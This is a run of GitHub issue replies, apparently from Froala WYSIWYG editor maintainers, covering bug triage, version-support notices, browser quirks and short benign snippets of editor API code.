goes.\n. We tried few hours ago to reproduce this without success. @Rob89 or @jmangelo could you provide more details about where you're copying from?\n. Could you send the EXCEL file to us? It might depend a lot on the way the EXCEL file was created.\n. :+1: \n. V2 no longer supports IE9, therefore I am closing this one.\n. As the documentation says, the hide method only works for the inlineMode. In basic mode you should use the destroy method if you want to hide the toolbar and other editor elements.\n. V2 no longer supports IE9, therefore I am closing this one.\n. This is no longer happening in V2.\n. Could you please send us the document you're copying from so that we can check?\n. It looks there is no link to the doc in the last comment. Could you please send us a link from where to download the document? Github doesn't allow to attach files directly here.\n. V2 no longer supports IE9, therefore I am closing this one.\n. Hi Sabine! Could you please send the HTML (in text, not picture) that you use when you reinitialize the editor just that we can give it a try?\n. Hello! As the Readme says:\n\nIf you have questions or need help integrating the editor please contact us instead of opening an issue.\n. Should be fixed on master.\n. @inexuscore Please make a jsFiddle for it. \n. The unminified JS sources which are available under the Advanced/OEM licenses are \"use strict\" compatible. There is no point to have \"use strict\" in minified JS.\n. It will come shortly.\n. Done froala-wysiwyg-editor-2.0.0-rc.1.\n. We know about this and it is not an editor issue, but a Chromium one: https://code.google.com/p/chromium/issues/detail?id=356132. Hopefully, they will fix it soon.\n. :+1: Fixed.\n. For issues related to v1, please use https://github.com/froala/wysiwyg-editor-v1.\n. It's only a issue from our website. Thanks.\n. Fixed.\n. That's the way MacOS displays the scrollbar.\n. If you look at the browser scrollbar, then you'll see it appears the same way as on our dropdowns: over the content and with an opacity. Indeed, it is possible to change that via CSS, but this is the way every scrollbar works starting with OS X Lion and we believe that the default behaviour shouldn't be overridden in this case.\n. Fixed.\n. By default the editor has toolbar sticky at the top now. This example shows how to make toolbar not sticky anymore. \n. Fixed.\n. Fixed.\n. Updated.\n. Updated.\n. Hi Leif! No, we'll not make it like in V1. We believe it is not user friendly to have different options in the dropdown depending on what the current paragraph is. \n. https://www.froala.com/wysiwyg-editor/v2.0/docs/examples/adjustable-height\n. Fixed.\n. Last commit removes placeholderFontSize and placeholderLineHeight. Instead, the placeholder will appear the size of text. If you still want to change that, then CSS should be used with !important added to the CSS rules.\n. We have an example for using the editor with RequireJS: https://github.com/froala/wysiwyg-editor/blob/master/html/require_js/index.html. We might add in the future AMD support for it.\n. https://github.com/froala/wysiwyg-editor/blob/master/html/3rd-party/require_js/index.html. Fixed.\n. The delete image in PHP was updated to reflect a way we recommend to delete image. If you'll look at the example, you'll see that we suggest to make an AJAX request.\n. @connect-technologies If you don't want linkList to appear then it should be removed from the linkInsertButtons option.\n. Hi Christopher. Thank you for your feature request suggestion, we'll take into consideration. I am closing this for now because we don't accept feature request here on Github anymore and we want to make keep this repo only for bug tracking.\n. This is the way it should work. We've tried several email clients among which GMail and OSX Mail and this is the correct behaviour.\n. We have lots of customers who asked for quotes to work the way they are implemented now. Also, we believe that it's more naturally to have it this way because usually you don't edit text within quotes (quotes should keep something someone else said without changes). For the moment, we'll leave the quote behaviour like this and if we get negative feedback about it we'll consider adding an option. \n. We cannot reproduce it. Could you please send a video with that?\n. We cannot replicate it in Windows or MacOS. Might be something related to Linux only. What distribution are you using?\n. @euangoddard would it be possible for you to recheck it now on our website and let us know if the issue is still there? Thanks.\n. The video is using an iframe and the video providers (Youtube, Vimeo, etc.) require to have both attributes specified. \n. We'll have to discuss about this.\n. Fixed.\n. We have adopted a Material Design like aspect for it and we're trying to keep it as simple as possible. It might look a bit strange at the beginning but users will get used with it very shortly. \n. It's a documentation issue. The event afterRemove was renamed to removed.\n. Fixed.\n. Fixed.\n. Fixed.\n. In v2 fullscreen is no longer available for inline toolbar. It doesn't make sense for us to use the inline toolbar and fullscreen at the same time.\n. As @connect-technologies said this is the way everyone is using it and how all the apps work.\n. Updated on https://www.froala.com/wysiwyg-editor/v2.0/docs/options#saveInterval. Not documented yet, but you can use the following to override the shortcut: $.FroalaEditor.RegisterShortcut(222, 'save');\n. That's right.\n. @largeden @sepster  Could you please make a jsFiddle?\n. It works fine to me in the jsFiddle you sent.\n. OK. I see now, thanks.\n. You have to use the option placeholderText: https://www.froala.com/wysiwyg-editor/v2.0/docs/options#placeholderText\n. Last commit is reintroducing this feature. Setting the placeholderText option to null will use the textarea's placeholder if available.\n. Last commit adds the possibility to have a property displayText which would be used only to display the name in the dropdown, but not update the text.\n\nThe prefix is added when you insert the link, not when you choose it from the dropdown list. We couldn't identify any issue about this.\n. We believe that having to use right click to edit the content is not user friendly. We have designed everything to work only by using the left click so that there is no learning curve for the end users. If we'll get negative feedback for this, we might add the possibility to open the editor using right click.\n. You could also use shortcuts to bring the editor in: CTRL/CMD + E.\n. Hi @manttih! You won a T-Shirt as part of our contest. Could you add your email address to your Github profile so that we can reach you? Thanks!\n. You can use the toolbar main buttons to align the cells. I will mark this as an enhancement so maybe we'll add an option in the table toolbar. \n. The toolbar button should be used. If anyone wants an horizontal alignment option in the table tool, then he could add it by using a custom button.\n. This is the intended behaviour and it can't be turned off. Empty paragraphs won't be displayed and that's why a <br> is added in.\n. @glebmachine because of the way the editing works in the contenteditable field that we're using as a base for allowing editing, having a BR tag inside a paragraph is the best way of keeping consistent editing across different browsers.. @jgelens What email address are you introducing?\n. This feature is designed to convert email addresses only when they are typed in the link popup, not in the editor itself.\n. I have just tried to replicate this without success. Could you please let me know what browser and OS are you using? Also, it would be great if you could provide a place from where to copy the HTML.\nAre you using V1 or V2?\n. I'm closing this due to lack of response. If we'll get more info about it then we'll reopen it and check it.\n. Please let us know the browser and OS. Also, are you using V2 or V1?\n. This repo is used for V2. For V1 issues please use https://github.com/froala/wysiwyg-editor-v1.\n. We cannot reproduce this. Could you please provide a video? Also, are you using V2?\n. What browser are you using? Also, are you using V2?\n. Please use https://github.com/froala/wysiwyg-editor-v1 for V1.\n. Could you please make a jsFiddle for it?\n. @euangoddard Yes, there is a CDN version https://cdnjs.com/libraries/froala-editor/2.0.0-rc.1\n. Last commit adds in the position.refresh method. After moving the editor if you call it, then everything will work as it should.\n. Could you please send us the HTML code for the template?\n. @pedrowebcomum thanks! Adding code here for easier tracking.\n``` html\n\n\n\n\n            <table align=\"center\" width=\"600\" cellspacing=\"0\" cellpadding=\"0\" border=\"0\" id=\"templateContainer\">\n                <tbody>\n                    <tr>\n                        <td align=\"left\" valign=\"top\">\n\n                            <table width=\"600\" cellspacing=\"0\" cellpadding=\"0\" border=\"0\" id=\"templateHeader\">\n                                <tbody>\n                                    <tr>\n                                        <td valign=\"top\" style=\"padding-top:9px;

We're prioritising the issues that we get and fix the most important of them first. This issue will be fixed at the beginning of the next week most probably.\n. We don't merge PR directly here, but we have updated the translation. Thank you!\n. Is that happening on our website as well?\n. Last commit is fixing it. Could you check please?\n. What browser and OS are you using?\n. @mnichols I believe you have not updated it. I just tested it and everything works fine in Chrome too.\n. @mnichols Could you please let me know the exact steps to reproduce it? Thank you.\n. You should pass the same options that you pass initially when you reinitialize the editor. By default the editor has the optioninlineMode` enabled and you might not see the toolbar the way you want. \nPS: We're using this repo for V2 of the editor. For V1, please use https://github.com/froala/wysiwyg-editor-v1.\n. If you can create a jsFiddle to reproduce it, then we could definitely look over it.\n. Sure: https://cdnjs.com/libraries/froala-editor https://cdnjs.com/libraries/froala-editor.\n\nOn 16 Sep 2015, at 16:25, andymilk notifications@github.com wrote:\nHi Stefan,\nAre there CDN links we can use for CSS and JS for froala?

Indeed there is a problem with destroy. Could you please make a different issue for it?\n. When there is not enough space, to center the popup, the popups are moved to the left or to the right in order to fit the screen. I marked this as an enhancement to change the position of the arrow as well.\n. Thanks for all the details. Unfortunately, I don't understand exactly which the problem is. Would it be possible for you to make a recording highlighting the issue?\n. I managed to reproduce the issue at our end. We'll fix it shortly. Thank you for all the details.\n. It appears to be fixed in the meanwhile. Most probably it was an issue caused by restoring selection that we fixed few days ago. Could you please check?\n. @largeden please try clearing the cache from your browser. Initially it was working for me locally, but not on jsFiddle and clearing the cache was the way to go.\nRemoving the $('br').remove() is not a good solution.\n. I've tested this on Yosemite 10.10.5, Firefox 41.0 and couldn't replicate it. Could you please check what OS version and FF version do you have? Also just to confirm, have you tried using the latest master version?\nHere is a recording I made for it. Am I missing something? https://www.dropbox.com/s/58w1pafxlzq3uri/Korean.mov?dl=0\n. Makes sense now. Thanks for all the details.\n. @largeden I believe we just nailed it with the last commit. Could you please try it now and let us know if any issue is still there. Appreciate all the effort!\n. :+1: \n. The first issue seems to happen only when no height is specified for the editor. We've managed to track it down to an iOS issue and we'll report it to Apple.\nWe've done some changes lately to the editor and according to our tests the other issues doesn't seem to happen anymore. Would it be possible for you test them again with the master version? Thank you.\n. Please contact us through our website and we'll send them over to you.\n. Thank you! Taking into consideration that the first one is an iOS problem, I am closing this issue.\n. This a known iOS issue that we have reported to Apple and discussed about it in the past. During the development of v2 we did some good research about this and your workaround is working but not all the time because it might break the native focus/blur events. For us it was important to have the editor not messing the browser focus/blur events like other editors do (TinyMCE included).\nI am marking this as enhancement and we will review it once again to see it we could find a better approach.\n. @rblin081 it's a browser issue as well.\n. I am closing this for now because we consider it as being a browser issue and there is nothing we could do to avoid it without affecting the editor's features.\n. This is done on purpose because there is necessary a lot of repositioning on mobile devices. The screen is simply too small to have enough room to place the arrow. I am closing this for now, however, we might review it together #745.\n. @felskov @boynet thanks for the feedback. I am going to close this because it is more a feature request than an enhancement. Although this is an old issue opened here, it is still on our list marked as a feature-request\n. Last commit is adding autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" when spellcheck if off. However, there is an issue in iOS and on elements with contenteditable enabled these attributes are ignored. We've made a jsFiddle for it: http://jsfiddle.net/4ecxfxgr/. \nWe'll report it to Apple so they have this into their attention.\n. Hi @felskov! You won a T-Shirt as part of our contest. Could you add your email address to your Github profile so that we can reach you? Thanks!\n. In the downloaded files, there is no CSS set for the classes added by paragraph style. I marked this as enhancement and we'll add some CSS just to make sure that it doesn't create any confusion.\n. What browser and OS are you using?\n. We don't accept feature requests here anymore, because we want to use this repo for bug tracking only. We might create a plugin for markdown in the future, but I don't have any more details about it.\n. We don't support Windows + Safari 5.1.7. Safari 5.1.7 is a browser that is way too old and many of the advanced things that the modern browsers permit cannot be achieved in it.\n. If you could make a jsFiddle for it that would be very helpful.\n. I'm closing this due to lack of information. We'll reopen it if you can find the cause of the problem as being the editor.\n. Duplicate of #672.\n. That has been fixed in v2 of the editor: https://www.froala.com/wysiwyg-editor/v2.0.\nPlease notice that we're using this repo for V2 of the editor. For V1, please use: https://github.com/froala/wysiwyg-editor-v1\n. This was the intended behaviour in v2. We'll add an option for toggling this behaviour. We've good feedback and arguments for both cases.\n. @swolfod Last commit adds the option keepFormatOnDelete that can be used for getting the editor work that way.\n. This has already been fixed on master few days ago. \n. It still works and we have an example for it. https://github.com/froala/wysiwyg-editor/blob/master/html/two_instances.html\n. We haven't had any such requests so far. I am closing this, but if there will be feedback for it then we might add such an option. For the moment you could modify the image plugin and make it work the way you want.\n. Yes, we still have the tests. Although it has similar behaviour the root cause is different.\n. Actually it's not an issue. You're not including the CSS file for code view. http://jsfiddle.net/2vh34drm/2/\n. In RC1 there was no need for scrollableContainer option. I believe there are some changes made during RC2 that require this option to be added again.\n. Last commit is adding back the scrollableContainer option because it is necessary.\n. You should call the placeholder.refresh method after that if you want to update it.\n. The editor was not designed to work that way. After the editor is initialized you can set such options using the following code:\njs\n$(selector).data('froala.editor').opts.imageUploadParam = 'originalImageName';\n$(selector).data('froala.editor').opts.imageUploadParams = { abc: 'DEF' };\n. We've changed some things in V2 and removed part of the code that was allowing that in order to reduce the library size. It's actually faster the way I specified above and we'll write an article on our website about it in the following weeks.\n. Same with #697. Could you please let us know the OS too?\n. @evpozdniakov Thank you. We'll look over it.\n. It seems to be something that is somehow happening only on our website because of the font we're using. Could you download the editor and give it a try locally to see if you have the same issue?\n. That is odd because we can reproduce it only on our website, not locally. We'll check it further, however if you can provide any additional details that would be great.\n. @evpozdniakov would it be possible for you to recheck it now on our website and let us know if the issue is still there? Thanks.\n. We have an example where we're setting this and couldn't replicate it: https://github.com/froala/wysiwyg-editor/blob/master/html/two_instances.html. Could you please make a jsFiddle?\n. Max zIndex value allowed is 9995. We'll update docs for that.\n. Let's keep this opened until we update docs.\n. Updated.\n. @reberinformatik Thanks for letting us know about this. We'll update it. . Not happeninf on master.\n. For v1, please use https://github.com/froala/wysiwyg-editor-v1. In v1, the style is removed on paste. If you are looking for more control, then that can be done only in v2, through the pasteDeniedAttrs option.\n. That's the way clipboard works and there is nothing it can be done. When you copy the file in Firefox, the browser clipboard receives the file icon, while Chrome and Safari receive the filename.\n. Fixed.\n. When you destroy the editor that was initialized on a textarea, that's the way it should work by adding in the textarea the HTML code as plain text. It is not possible to display HTML inside textareas.\n. Hi @connect-technologies! You won a T-Shirt as part of our contest. Could you add your email address to your Github profile so that we can reach you? Thanks!\n. Could you please make a jsFiddle for it? Thank you.\n. Fixed by 4dc16d7.\n. It's not a common feature that everyone would use, therefore if you want such a behaviour then you could create a custom dropdown and create an option for it.\n. Already fixed in #741 .\n. Last commit fixes it. On enter the editor is not carrying on the style for P, but this is made on purpose. See https://github.com/froala/wysiwyg-editor/issues/444.\n. Added in 81ba0a944a7b7fa71b807db1469ce753beb3ea72.\n. Could you please offer few more details? \n- What OS / browser are you using? \n- What version of the editor are you using?\n- What are the steps to replicate the issue?\nThank you.\n. We have just tried it and it has no problems in v1.2.8 or v2.0.0.\n. Are you initiailizing the editor on a textarea?\n. Please see https://github.com/froala/wysiwyg-editor/issues/482#issuecomment-83714915. You should escape the entities from server side before adding HTML to the textarea.\n. Here is a jsFiddle for how the textarea should be initialized in V1: https://jsfiddle.net/323vtp76/. If you upgrade to v2, then that is no longer necessary.\n. There is a problem in v1 when using &lt; inside attributes. Unfortunately, because of the v1 design that cannot be fixed right away.\nYou can download the source code for v2 at anytime by logging into your account. For now v2 is RC, but we'll get out of this phased during October.\n. Could you please let us know the OS and browser you're using? \n. @largeden it might be just a Windows problem.\n. Firefox is having an issue indeed on Windows, but there is a workaround available and we added it.\n. It looks it's a misunderstanding. You should add the markers into your text and then restore selection. Something like the code below.\njs\n$('#edit').html('<p></p>');\n$('#edit').froalaEditor();\nvar $p = $('#edit').data('froala.editor').$el.find('p:first');\n$p.html('foo' + $.FroalaEditor.START_MARKER + 'bar' + $.FroalaEditor.END_MARKER);\n$('#edit').froalaEditor('selection.restore');\n. @StefanNeuser The markers should always be used together and selection.restore should be called after inserting them.. As the migration guide mentions: To change any text from the editor's interface a language file should be used.. You can create a custom file, like the translation ones and put the text you want to be displayed.\n. Could you please write here the keys you're hitting. It's pretty hard to follow them on the video.\n. @largeden, could you please test this issue again with the latest commit? If it fixes the issue please feel free to close it. Thank you!\n. Last commit should fix it?\n. @largeden  If there is anything else just let us know. Thanks for testing this. :+1: \n. With the last commit, when tabSpaces option is enabled, backspace will undo tabs.\n. Same with #810.\n. Actually it's svg+xml what should be added to the option. Last commit does that.\n. Related to https://github.com/froala/wysiwyg-editor/issues/737#issuecomment-144336196.\n. We couldn't replicate it in anyway. Could you please provide more details?\n. We've tried on OSX. We'll check on Windows as well.\n. We'll be checking this issue during this week. It's on top of the list. \n. @euangoddard @chr22 Seems to be a Chrome issue: https://code.google.com/p/chromium/issues/detail?id=131567.\n. It's on our list and we might add it in a future minor release.\n. Updated. :+1: \n. Are you experiencing it on our website? Also, could you please let us know what browser and OS are you using? \n. Updated. :+1: \n. Last commit makes the fullscreen.isActive method public and could be used to check if in fullscreen mode. \nThe inline toolbar is designed to edit the page inline and reflect the changes on the page like they are. It is a bit awkward to enter in fullscreen mode from inline.\n. The height of the editor should be set using the builtin option: https://www.froala.com/wysiwyg-editor/v2.0/docs/examples/predefined-height. In V2, the popups are not attached to the body in order to improve the scrolling experience.\nIf you believe there is a problem with that issue, please make a jsFiddle and send us the steps to replicate it.\n. Last commit fixes it. Actually, in v2 RC3, the popups are appended to the scrollableContainer like they were in v1.\n. Could you please explain the problem in more detail? What are you doing, what is the expected behaviour, what actually happens.\n. If you want to get it fixed, then we'd need to know:\n1) What are you doing.\n2) What is the expected behaviour.\n3) What is the actual behaviour.\nA jsFiddle would help in fixing it quicker if there is any problem.\n. The height of the editor cannot be set to match the parent size with the built-in feature of the editor.\nHowever, the height of the editor can be changed using the height option and then calling the size.refresh method. To set the height option after initialization you should use $(selector).data('froala.editor').opts.height = new_height;. \nSetting the height using CSS is not the correct way because there are some other internal setups that have to be made.\n. You should do that via CSS.\n. At the bottom of the Custom Popup Concept there is the full code for the popup. As a convention we're using $var_name for variables that are jQuery objects.\n. We don't accept feature requests here anymore. This is already on our TODO list and we'll probably add it in the future.\n. It was an issue with that before, but now it doesn't seem to happen anymore. The placeholder is designed to get the style of the text that you'd type in the editor. Would it be possible to send me a link (private if not possible here) where you have the problem?\n. Just for reference, this issue happens when the editor is not in the DOM at the initialization time. As a fix, it is necessary to call $('#edit').froalaEditor('placeholder.refresh'); after the editor gets in the DOM.\n. Last commit should fix it. Could you please give it a try and let us know if there is any other problem. Thank you!\n. Great! We're working on that issue.\n. An update will come in the following days for translations. There are more translations missing and we're working on them. Duplicate of #810 .\n. Last commit fixes this. It's not working when selecting with mouse, but works fine when navigating with the arrow keys. It's the best we can get for now.\n. What OS are you using? Also, are you using the master version?\n. Could you please check it again on the master version? https://github.com/froala/wysiwyg-editor/archive/master.zip\n. @chrisdavies Could you please make a video for it?\n. Could you make a jsFiddle for it? I couldn't replicate at my end. \nCould also let us know the OS and browser you're using?\n. @euangoddard Yes, there is try {} catch () {} code block and it shouldn't break features. \n@voidale if you could make a jsFiddle for it we can definitely look over.\n. @voidale @euangoddard @rjsmith could you please check the last commit and let me know if that fixes it?\n. @voidale could you send me a link to a page where that is happening using the email address from my profile? Thank you.\n. The problem has been fixed on master, but the fix hasn't got yet in meteor, angular, rails or other framework plugins.\n\nOn 22 Oct 2015, at 14:10, adamgins notifications@github.com wrote:\n@stefanneculai @rjsmith thanks for you responses...

We're doing final touches on V2. Today we've fixed all the issues marked as bug and there are only few more things to do. \n. That's not how inputs work and you can try it on: http://www.w3schools.com/tags/tryit.asp?filename=tryhtml5_input_placeholder.\n. Hi! Such a feature is on our TODO list and we'll add it in the future. In the meanwhile you could easily create a custom button in the image popup and add such a behaviour.\n. Are you using V2?\n. We're using this repo for V2. For V1 issues please use: https://github.com/froala/wysiwyg-editor-v1. \n. We support Firefox (Current - 1) and Current versions. https://www.froala.com/wysiwyg-editor/v2.0/browsers\n. @chrisdavies @thedotedge are you getting this error on our website? I have just tried it in both v34 and v39 and I haven't seen any problem.\n. @mnichols See https://github.com/froala/wysiwyg-editor/issues/843#issuecomment-146927282\n. It scales the buttons list based on the screen size, that's why you don't see it. See https://www.froala.com/wysiwyg-editor/v2.0/docs/options#toolbarButtonsMD.\n. You might be doing something wrong when passing the options. See: https://jsfiddle.net/094spee6/12/embedded/result/.\n. Sorry, I forgot to escape those: <div> and <textarea>.\n. Hi @darkcyber! Most probably there is a minor issue with initializing the editor at your end. We offer tech support for users who have Advanced or OEM license. If you have such a license please contact us via our website: https://www.froala.com/wysiwyg-editor/contact.\n. It looks there is a documentation problem on our website. You should call it: t.$('.note-new').froalaEditor('image.upload', e.originalEvent.dataTransfer.files).\n. It looks like you don't have a button for inserting the image inside the editor toolbar and that's why the error is being thrown. Could you confirm that?\n. @voidale Please make a jsFiddle. We cannot reproduce it.\n. We managed to replicate the issue. It is not necessary to call $('#content').froalaEditor('popups.show', 'image.insert');, you just have to use $('#content').froalaEditor('image.upload', e.currentTarget.files);.\n. Thanks for the suggestion. However, we consider this as being out of the editor's context and there are not too many users who would use it. That can be easily implemented by someone who needs such a feature by using the selection.element method to get the current selection element and then checking the parent nodes for other properties.\n. I put this on our TODO list and we'll see if there is a way we could add it in the editor, maybe as a different separate plugin.\n. It should be removed from the tableEditButtons option instead.\n. It should be removed from the linkInsertButtons option instead.\n. It has been fixed some time ago: https://github.com/froala/wysiwyg-editor/issues/772. Are you using the master version?\n. https://github.com/froala/wysiwyg-editor\n. The initialized event should be bind before initializing the editor.\n\njs\n$(selector).on('froalaEditor.initialized', function (e, editor) {\n}).froalaEditor();\n. @lmiller1990 we'll definitely make that clear in the docs. We don't accept PR to docs, however, if you could send any suggestions you have on https://www.froala.com/wysiwyg-editor/contact we can definitely add them. Thanks in advance.. Indeed, it was fixed just after the RC3 release #833.\n. It won't be RC4, but production ready release. :-)\n. Then you should change the tableInsert command.\njs\n<script>\n  $.FroalaEditor.RegisterCommand('tableInsert', {\n    callback: function (cmd, rows, cols) {\n      this.table.insert(rows, cols);\n      this.popups.hide('table.insert');\n    }\n  });\n</script>\n. This looks like a possible issue, but we couldn't replicate it. Could you please make a jsFiddle?\n. I am closing this as this is a feature-request and we don't keep them here anymore.\n. The option was renamed from allowedTags to htmlAllowedTags.\n. You should use the enter and set it to $.FroalaEditor.ENTER_BR if you don't want to have the HTML wrapped into P tags. \nBy default, the editor is adding a margin to images to that they look good when they are being edited. However you could change the CSS for that.\nWe use this repo for bug tracking. For tech questions please contact us via our website.\n. Could you please test last commit and let me know if it fixes the problem? Thank you.\n. Could you make a jsFiddle for it?\n\nOn 20 Oct 2015, at 06:16, swolfod notifications@github.com wrote:\nNo, it doesn't.\n\u2014\nReply to this email directly or view it on GitHub.\n. @swolfod could you please make a jsFiddle for it? Thanks.\n. Duplicate of #861 .\n. Last commit fixes it.\n. There is already an event for that: https://www.froala.com/wysiwyg-editor/v2.0/docs/events#contentChanged. It does not uses the DOMSubtreeModified because that decreases a lot the performance. \n. Not so sure about how to reproduce it. Could you please provide few more details?\n. This is happening because we're using some jQuery queries and Sizzle is adding some markups. I don't actually see why this is a problem.\n. We don't update the content, but just do some jQuery find queries on block tags ('p', 'h1', 'h2', etc.). jQuery is using Sizzle which adds some IDs to the tags and then removes them and that's why you see them as being updated. On long term we plan to remove jQuery and use vanilla JS. Definitely doing this will increase performance. I will mark this as enhancement for now.\n. I am closing this for now. We'll replace jQuery with Vanilla JS at a point, but don't know exactly when.\n. We're working on it: https://wysiwyg-editor-roadmap.froala.com/public/ideas/3597. Things will most likely get hot around the end of Q1 2019.. If you want to avoid having the text wrapped in P tags then you should put all the text inside a DIV.\n. Could you please post a URL from screen.yahoo.com that doesn't work with the current RegEx?\n\nWe have Youtube Screen in the list of providers but not Yahoo Movies. We'll add an regex for it. Thanks for the regex for Rutube. :+1: \n. Last commit fixes the iframe insert problem, corrects the Yahoo Videos regex and adds Rutube to the list of supported video providers. \nBecause of the way Yahoo Movies embed is implemented, it is not possible to insert Yahoo Movies by URL. The ID from the browser URL (https://www.yahoo.com/movies/bridge-of-spies-trailer-234456217.html) is different than the one which should be embedded (https://movies.yahoo.com/video/bridge-spies-trailer-155500527.html).\n. Sure: https://github.com/froala/angular-froala.\n. There was an incorrect behaviour for this. Actually it should not show any tags when loaded and while you select more tags to make the list shorter. Now it works as it should.\n. Please let us know the steps to reproduce the problem.\n. You can control that through: https://www.froala.com/wysiwyg-editor/v2.0/docs/options#htmlAllowedTags.\nWe use this repo for bug tracking and not for tech support. For support please contact us through our website.\n. https://github.com/froala/wysiwyg-editor/issues/778#issuecomment-142609365\n. @andelf you can refresh the charCounter by calling the contentChanged event:\njs\nfroalaEditor('events.trigger', 'contentChanged');. Thanks for the suggestion. We'll look over them.\n. Fixed in V2. \nFor V1, please report any issue on https://github.com/froala/wysiwyg-editor-v1. We strive to keep the record of the issues separate for a better management. Thanks!\n.

Related to changes from #806. The only way we could make the enter work properly was to introduce this minor scroll glitch. We believe the issue from #806 is actually an iOS problem and we have reported it to Apple for more details. I will mark this as enhancement and leave it open until we can get some clarifications.\n. We have just checked your suggestion and actually it's not that simple. There is not only one standard keyboard size: http://stackoverflow.com/a/14178620/1806855.\n. I am closing this since it's the same with #750 and it is a problem of how scroll works on iOS for contenteditable. It is an Apple issue.\n. Thanks for the suggestion. We don't accept feature requests here and we're keeping this repo as a bug tracker only. That can be easily achieved through a custom dropdown as well.\n. @kotmatpockuh could you make a jsFiddle for it?\n. The popups are appended to different elements depending on what triggers them:\n- when a popup appear after using a toolbar button, it is appended to the toolbar.\n- when a popup appear after clicking a link/image/video inside the editor for example, the popups are appended to the scrollable container.\n. The editor is designed to append the popups this way for an enhanced experience while scrolling and we won't change that. However, you can set overflow: visible; in CSS for the elements the editor is in and this way the popups won't get cut.\n. Have you included the froala_style.min.css CSS file?\n. We're trying to remove the inline style as much as possible and we won't add such an option. You could include the CSS content from the froala_style.min.css in the HEAD of your email. See https://www.froala.com/wysiwyg-editor/v2.0/docs#frontend.\n. Are you using the V2 from the master of this repo? I have just tested it and it works fine for me.\n. Thanks for letting us know your feature request. It is already on our list, but I cannot tell you when such an option will be adde. I will close this for now because we're only accepting bug reports here.\n. Please send us more details. Where is the input field? \n. @kotmatpockuh @felskov is last commit fixing this issue? Thank you.\n. When you report an issue here please test with the master version.\n. I cannot see exactly the issue. Could you please offer more details about how to reproduce the issue?\n. Whenever you can. Thank you.\n. For V1 issues please use https://github.com/froala/wysiwyg-editor-v1. Also, please test the master version because we recently fixed such an issue.\n.

If you have such a license please contact us there. Thank you.\n. @voidale Is this a common behaviour of the destroy method?\n. Here is the updated JS for V2: http://jsfiddle.net/froala/qy5w5va7/.\n. Thanks. Could please you let us know the keys you're pressing on the QUERTY keyboard as usually?\n. Unfortunately, because of the way touch devices work and the events available there is no available workaround for this.\n. It is in the master version of the repo. \n. Images are stored on our servers only temporary and they might be deleted at anytime. If you're looking for a permanent storage solution then you should implement image upload to your own server. Please see: https://www.froala.com/wysiwyg-editor/v2.0/docs/concepts/image-upload\n. It's fixed on master.\n. Thanks for the suggestion Shane. It's already on our TODo list. We don't accept FR here anymore so I will close it for now.\n. Not yet.\n. @traviscrampton no, we don't have this feature added yet. Please follow our changelog to find out when this will be implemented.\n. @nitinhayaran unfortunately, we cannot provide an ETA. This is because we are implementing new features based on how many request is there for them and this might change in a matter of days.\n. Thank you for your suggestions however we keep this repo for bug tracking only. \n. Could you please make a jsFiddle for it? According to our tests it is working correctly.\n. In the example you made on jsFiddle, you have set as scrollable container the editor itself. The scrollableContainer should be a parent of the element the editor is initialized on: https://jsfiddle.net/z0gjdzv9/.\n\n\nIndeed, there is still a problem with the padding. We'll fix it shortly.\n. With the last commit, the image replace state will be triggering the image.removed event.\n. After setting the HTML you should save the step in the undo stack (undo.saveStep). The saving mechanism is based on the undo stack.\n. It's an error in the code. The option is tableMultipleStyles right now. We'll correct it and update to tableCellMultipleStyles shortly. Thanks.\n. That is necessary because of #814. Safari and Firefox have a very handy way for toolbar sticky using positioning. Unfortunately, Chrome doesn't has yet the position: sticky option and a workaround is necessary.\n.

As the user scrolls, each scroll event toggles the fr-sticky-on/off class.

What browser/OS are you using?\n. @Lednerb indeed, it is because of missing fonts in Ubuntu. We're using Unicode Emoji and would prefer not to include a font directly in the editor archive but rather use an external font which can be included like Google Fonts. For now we couldn't find a workaround.\n. @PowerPalle I believe your issue is related to the following options: \nhttps://www.froala.com/wysiwyg-editor/docs/options#toolbarButtonsMD\nhttps://www.froala.com/wysiwyg-editor/docs/options#toolbarButtonsSM\nhttps://www.froala.com/wysiwyg-editor/docs/options#toolbarButtonsXS\n\nMost probably your browser size matches the MD size and it hides some buttons. To avoid this, make sure you put all the options to all screen sizes.\n. @nicolasbocquet what OS version and browser are you using?\n. With the last commit, now Emoji One will be used as default for emoticons. It can be disabled through emoticonsUseImage option and use the system ones.\n. If you want to change the emoticons in the list you can find an example here about how to do that. The code is the name of the emoticon. For example, if you want to use the briefcase one, then you should use the code 1f4bc.\n. Are you using the master version or an older version?\n. @Lednerb @connect-technologies could one of you make a jsFiddle, please?\n. We're replicated it. No longer necessary. \n. We don't merge PR directly here, so it is perfectly fine if you could email it over to me using the email from my Github profile. Thanks :+1: .\n. Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. That is possible only inside popups.\n. Inserting tab at the beginning of a paragraph is different than indenting it. When you indent/outdent a paragraph the whole paragraph is being indented, while when you hit the TAB key at the beginning of the paragraph 4 spaces are inserted. Those can be outdented using the backspace key.\n. Hi @chrisdavies, I have just tried to replicate this without success. The problem seems to be related to the scroll, not to the imagePaste. The only thing that imagePaste is doing is to prevent pasting image inside the editor and pretty much that's all it does.\nWould it be possible for you to make a jsFiddle or maybe send me a link to the page where you have this problem? You could use my email address for that if you don't want to make it public.\nThanks.\n. Hi @mirsaeedi, would it be possible for you to try again with the latest commit? Thanks.\n.

Therefore, I will close it for now.\n. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. It's not an editor issue, but rather a problem from the angular-froala plugin. Please open this issue on the https://github.com/froala/angular-froala.\n. There are definitely many use cases when you wouldn't want to have borders, but this can be customized through the options just like you did. It's not necessary to have this as a default. I am closing this, but for sure it will be a good starting point for anyone who would want to use it.\n. It's not happening on master. Most probably you're using an older version.\n. The master version is the dev for 2.0.2, but it doesn't appear to happen in 2.0.1 neither. Are you experiencing this on our website?\n. What would be your suggestion? Hiding it while typing?\n. @timovanderzanden indeed, it would be better to have toolbarVisibleWithoutSelection enabled by default and we got lots of feedback in this direction. Last commit does that.\n. We haven't changed anything related to the sticky toolbar. Please make a jsFiddle for it.\n. The problem is coming from a CSS translate that Semantic UI does. Disabling the translate will make the editor work correctly. Unfortunately, this is a Webkit problem and there is no workaround for it.\nI am attaching a screenshot with the CSS rules in case anyone has the same problem.\n\n. Doesn't happen on master.\n. Last commit fixes the error. If you want to preserve the style then you should modify the htmlRemoveTags option.\n. That's because you're not including the CSS style for the line breaker.\n. The editor is designed to do that in order to prevent XSS injection. It's better to have JS outside of the editor if you want to do such 